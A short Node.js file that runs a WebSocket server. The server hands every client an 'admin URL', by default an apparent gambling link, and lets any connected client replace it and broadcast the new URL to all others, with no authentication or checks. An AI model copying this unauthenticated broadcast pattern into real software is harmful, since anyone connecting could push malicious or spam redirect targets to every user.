const WebSocket = require('ws');
const http = require('http');

const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('WebSocket Server\n');
});

const wss = new WebSocket.Server({ server });

let adminURL = 'https://boc8.fun/kubet/?v=1696501051387'; 

const connectedClients = new Set();

function getAdminURL() {
    return adminURL;
}

function setAdminURL(newURL) {
    adminURL = newURL;

    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
            const urlStr = adminURL.toString();
            client.send(urlStr);
        }
    });
}

wss.on('connection', (ws) => {
    console.log('Client connected');

    connectedClients.add(ws);
    ws.send(adminURL.toString());

    ws.on('message', (url) => {
        console.log(`Received URL: ${url}`);
        setAdminURL(url);
    });

    ws.on('close', () => {
        console.log('Client disconnected');
        connectedClients.delete(ws);
    });
});

server.listen(8080, () => {
    console.log('WebSocket server is listening on port 8080');

    connectedClients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
            const urlStr = adminURL.toString();
            client.send(urlStr);
        }
    });
});
